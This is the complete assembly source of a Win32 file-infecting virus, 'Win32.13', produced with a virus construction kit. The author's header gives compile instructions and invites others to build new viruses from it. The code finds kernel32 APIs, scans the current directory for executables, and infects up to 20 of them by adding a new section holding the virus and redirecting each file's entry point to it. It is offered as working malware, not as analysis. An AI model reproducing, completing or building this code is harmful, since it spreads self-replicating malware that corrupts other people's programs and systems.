              
;
;
; Win32.13 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.13
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 13
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 50
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 55810 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov ebx, dword ptr [esp-4]
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 mov ebp, ebx
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, [esi+3Ch]
 add edi, esi
                                        ; get File Alignment
 mov ebx, [edi+3Ch]
 mov dword ptr [ebp+filealign], ebx
                                        ; clear esi
 and esi, 0
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], edx
 mov ecx, dword ptr [ebx+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [ebx+74h]
 shl ecx, 3
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ebx+6h]
 mov eax, 28h
 pushad
 mov eax, edx
 mul eax
 mov dword ptr [ebp+Misc1], 0
 add dword ptr [ebp+Misc1], eax
 popad
                                        ; clear edx
 mov edx, -10497d
 add edx, 10497d
 add edx, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, ecx
 add ebx, edx
 lea ecx, [ebp+newsection]


 xchg ecx, ebx
 push ecx
                                        ; Calculate the RVA of the new section
 mov ebx, [ecx-5*8+8d]
 add ebx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], eax
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov edx,[ecx-5*8+20d]
 add edx,[ecx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov ecx, ebx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], edx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 push ecx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; mov eax, 16
 mov eax, ( 16d - 36d )
 add eax, 36d
 lea edx, [ebp+newsection]

 pop ecx
WriteNewSectionLoop:
 push dword ptr [edx]
 pop dword ptr [ecx]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 dec eax
                                        ; add edx, 4
 add edx, 4d
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
 mov eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], '13'
 mov edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear edx
 sub edx, edx
 push edx
 push ecx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz CloseFile
                                        ; clear edx
 mov edx, 0
 push ecx
 push edx
 push edx
                                        ; mov ebx, 2
 mov ebx, 2d
 push ebx
 sub eax, edx                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
                                        ; mov eax, ebx
 mov eax, ebx
                                        ; mov esi, eax
 mov esi, eax
 mov dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], esi
 push edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bh, byte ptr [edx]
 cmp bh, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 test ecx, ecx
 jz FoundApi1
                                        ; add edx, 1
 add edx, 1d
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop eax
 mov ecx, dword ptr [ebp+TempApisearch1]
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov ebx, eax
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [ebx]
 xor dword ptr [ebp+Trash1], 1485594    ; Trash
 clc
 rcl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop ebx
 add ebx, dword ptr [eax]
 push ebx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 mov eax, -43208d
 add eax, 43208d
 xor eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], eax

                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; add eax, 1
 inc eax
GetKernelLoop:
                                        ; clear ebx
 mov ebx, -54895d
 add ebx, 54895d
 add eax, -1
 mov bx, word ptr [eax+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], eax
 mov ecx, eax
 add ecx, [eax+3Ch]
 mov [KernelPE+ebp], ecx

 jmp GetApis

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]

                                        ; Set Infection Counter
                                        ; mov eax, 20
 mov eax, ( 20d xor 4d )
 xor eax, 4d
 mov dword ptr [ebp+InfCounter], eax
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax
 add edx, ecx                           ; Trash



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea eax, [ebp+WFD_szFileName]
 xchg ebx, eax

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi
 rcl edx, 11d                           ; Trash


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
                                        ; check for minimum filesize
                                        ; clear edx
 mov edx, -54666d
 add edx, 54666d
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 mov ecx, offset WFD_nFileSizeHigh
 add ecx, ebp

 cmp dword ptr [ecx], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx eax, word ptr [ecx]
 cmp eax, 'ZM'
 je Goodfile
                                        ; clear ebx
 mov ebx, 0
 cmp ebx, 0
 je Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 je Notagoodfile
 mov edi, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '13'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov bx, word ptr [edi+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea eax, [ebp+WFD_szFileName]

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov esi, ebp
 add esi, offset WFD_szFileName

                                        ; mov ebx, 276
 mov ebx, ( 276d xor 34d )
 xor ebx, 34d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ecx
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 xor ebx, edx                           ; Trash
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edi, edx

 push edi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ebx
 mov ebx, 26137d
 sub ebx, 26137d
 add ebx, NumberOfApis
 mov ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 mov eax, 0
 add eax, [ecx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add eax, 4
 add eax, 4d
                                        ; get NTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add eax, 4
 dec eax
 add eax, 5d
                                        ; get OTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg edi, eax

 lea eax, [ebp+APINames]
 xchg eax, edx


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 mov ecx, edx
APINameDetect:                          ; calculate the lenght of the names
 inc ecx
 cmp byte ptr [ecx], 0
 jne APINameDetect

 sub ecx, edx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; edx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add edx, 1
 add edx, 1d
 push edx
 add dword ptr [esp], ecx
 pop edx
 mov eax, dword ptr [ebp+TempAPI]
 xor dword ptr [ebp+Trash1], 1859968    ; Trash
 mov dword ptr [edi], 0
 add dword ptr [edi], eax
                                        ; add edi, 4
 add edi, 4d
 dec ebx
 jnz GetApisLoop
 lea eax, [ebp+Outbreak]

 push eax
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 AlignReg1   dd 0h
 TempApisearch1 dd 0h
 Trash1      dd 0h
 counter     dw 0h
 Misc1       dd 0h
 TempApisearch2 dd 0h
 NewSize     dd 0h
 Attributes  dd 0h
 OTableVA    dd 0h
 TempAPI     dd 0h
 filealign   dd 0h

 ATableVA    dd 0h
 filemask    db '*.exE',0
 FileHandle  dd 0h
 NewEIP      dd 0h
 NTableVA    dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldEIP      dd 0h
 KernelPE    dd 0h
 sectionalign   dd 0h
 db 'Win32.13 of SnakeByte',0
 OldBase     dd 400000h

 APINames:
 db 'CreateFileA', 0
 db 'UnmapViewOfFile', 0
 db 'FindClose', 0
 db 'CloseHandle', 0
 db 'SetFileAttributesA', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'GetFileAttributesA', 0
 db 'MapViewOfFile', 0
 db 'CreateFileMappingA', 0

 KernelMZ    dd 0h
 MapHandle   dd 0h
 InfCounter  dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 AlignReg2   dd 0h
 MapAddress  dd 0h
 FindHandle  dd 0h
 PEheader    dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, -11589d
 add ecx, 11589d
 push ecx
 call ExitProcess



end FakeCode

